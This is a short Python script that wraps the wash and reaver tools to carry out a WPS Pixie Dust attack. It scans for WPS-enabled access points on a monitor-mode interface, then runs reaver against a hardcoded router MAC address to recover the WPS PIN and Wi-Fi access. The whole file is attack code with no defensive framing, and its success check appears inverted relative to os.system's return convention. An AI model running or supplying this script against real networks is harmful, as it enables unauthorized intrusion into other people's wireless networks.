import os
import subprocess
from subprocess import check_call

def pixie():
    print("Attempting PixieDust")
    order = "sudo wash -i wlan0mon"
    geny  = os.system(order)
    order = "sudo reaver -i wlan0mon -b F4:F2:6D:3C:40:92 -c 1 -vvv -l 1 -K 1 -f"
    geny  = os.system(order)
    if geny == 1:
        print("\nPixieDust Complete.\n")
        return 1    
    return 0
    